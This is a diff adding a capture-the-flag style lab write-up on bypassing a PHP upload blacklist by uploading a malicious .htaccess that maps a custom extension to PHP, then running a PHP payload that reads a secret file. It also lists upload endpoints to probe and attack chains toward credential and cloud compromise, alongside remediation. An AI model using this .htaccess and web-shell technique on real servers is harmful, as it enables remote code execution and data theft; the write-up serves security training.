@@ -714,3 +714,248 @@ Upload → RCE → Privilege escalation via cron / jobs
 ## 🧩 One-Line Takeaway
 
 > When uploads aren’t executable, don’t stop — escape the directory.
+
+---
+
+# ✅Lab-4 File Upload Vulnerability — Blacklist Bypass via Server Configuration Override (.htaccess)
+
+---
+
+## 1. Overview
+
+This lab demonstrates how file upload protections based on *blacklisting dangerous extensions* (such as .php) can be bypassed by abusing *server-side configuration files*.
+
+Even when:
+
+- .php uploads are blocked  
+- Upload directories are assumed to be non-executable  
+
+An attacker can still achieve *Remote Code Execution (RCE)* by:
+
+- Uploading a malicious configuration file  
+- Redefining executable extensions  
+- Uploading a web shell using a custom extension  
+
+This is a *real-world, high-impact vulnerability, commonly found on **Apache-based servers*.
+
+---
+
+## 2. What This Topic Is About
+
+This vulnerability exists due to *misplaced trust in blacklists* and *server misconfiguration*.
+
+Key concepts:
+
+- Blacklists are incomplete and unreliable  
+- Apache allows *directory-level configuration overrides*  
+- .htaccess can redefine execution rules  
+- Servers, not applications, decide what gets executed  
+
+Attackers abuse this to *create their own executable extensions*.
+
+---
+
+## 3. Why This Vulnerability Exists
+
+Developers often assume:
+
+> “Blocking .php uploads is enough.”
+
+This assumption is incorrect because:
+
+- Apache supports .htaccess overrides  
+- .htaccess can map new file extensions to PHP  
+- Blacklists only block known extensions  
+- Configuration files are often forgotten  
+
+*Result:*  
+The attacker regains code execution even when .php is blocked.
+
+---
+
+## 4. Lab Walkthrough (Exact Steps)
+
+### Step 1 — Login
+
+Credentials used:
+
+- *Username:* wiener  
+- *Password:* peter  
+
+---
+
+### Step 2 — Initial PHP Upload Attempt (Fails)
+
+Attempt to upload:
+
+exploit.php
+
+Payload:
+
+```php
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+Result:
+- Upload is blocked
+- .php extension rejected
+
+---
+
+### Step 3 — Upload Malicious .htaccess File
+Intercept avatar upload request and modify:
+- Filename
+- .htaccess
+
+Content-Type
+- text/plain
+
+File Content
+- AddType application/x-httpd-php .l33t
+
+Result:
+- Upload succeeds
+- Apache now treats .l33t files as PHP
+
+---
+
+### Step 4 — Upload Web Shell with New Extension
+Upload payload again as:
+exploit.l33t
+
+Payload remains unchanged:
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+
+Upload succeeds.
+
+---
+
+### Step 5 — Trigger Execution
+Access uploaded file:
+GET /files/avatars/exploit.l33t
+
+Result:
+- PHP executes
+- Carlos’s secret is displayed
+- Lab solved 🎯
+
+---
+
+## Evidences
+
+### 📸 Screenshot 1 — PHP upload blocked
+
+![php extension blocked](../images/htaccess-php-upload-blocked.png)
+
+### 📸 Screenshot 2 — .htaccess upload successful
+
+![htaccess file upload in text/plain](../images/htaccess-upload-success.png)
+
+### Screenshot 3 - php shell upload
+![php shell uplaod using extension .l33t extension](../images/php-upload-success.png)
+
+### 📸 Screenshot 4 — Carlos secret revealed
+
+![carlos secret](../images/htaccess-carlos-secret.png)
+
+
+## 5. Real-World Scenarios
+
+### Scenario 1 — Avatar Upload → Full RCE
+- .php blocked
+- .htaccess allowed
+- Attacker enables execution
+- Uploads shell
+- Full server compromise
+
+---
+
+### Scenario 2 — CMS Plugin Upload Abuse
+- CMS blocks .php
+- Apache honors .htaccess
+- Attacker maps .jpg → PHP
+- RCE achieved
+
+---
+
+### Scenario 3 — Shared Hosting Escalation
+- One vulnerable site
+- Attacker gains RCE
+- Pivots to other sites on same server
+
+---
+
+### Scenario 4 — WAF Blacklist Bypass
+- WAF blocks .php, .phtml, .php5
+- .htaccess allowed
+- Attacker creates .safe extension
+- WAF completely bypassed
+
+---
+
+### 6. High-Value Target Endpoints
+Always test file uploads at:
+```
+/upload
+/avatar
+/profile-picture
+/images
+/media
+/files
+/assets
+/import
+```
+
+Try uploading:
+```
+.htaccess
+.user.ini
+web.config
+```
+Especially on Apache servers.
+
+---
+
+### 7. Multi-Chain Attack Possibilities
+
+- Chain 1
+Upload → .htaccess → PHP execution → RCE
+- Chain 2
+Upload → RCE → .env extraction → DB takeover
+- Chain 3
+Upload → RCE → SSH key theft → lateral movement
+- Chain 4
+Upload → RCE → Cloud credentials → full cloud compromise
+
+
+---
+
+## 8. Remediation
+
+- ❌ Ineffective Fixes
+- Blacklisting .php
+- Client-side checks
+- MIME-type validation only
+
+✔ Correct Fixes
+
+- Disable .htaccess uploads
+- Set AllowOverride None in Apache
+- Use strict allowlists
+- Validate magic bytes
+- Store uploads outside web root
+- Disable execution in upload directories
+- Use separate domain for user uploads
+
+---
+
+## 9. Extra Notes & Pentester Tips
+
+- Always identify server type (Apache / Nginx)
+- Try config files:
+- .htacess
+- .user.ini
+- web.config
+
+### Execution is controlled by server configuration
+> If .php is blocked → create your own extension
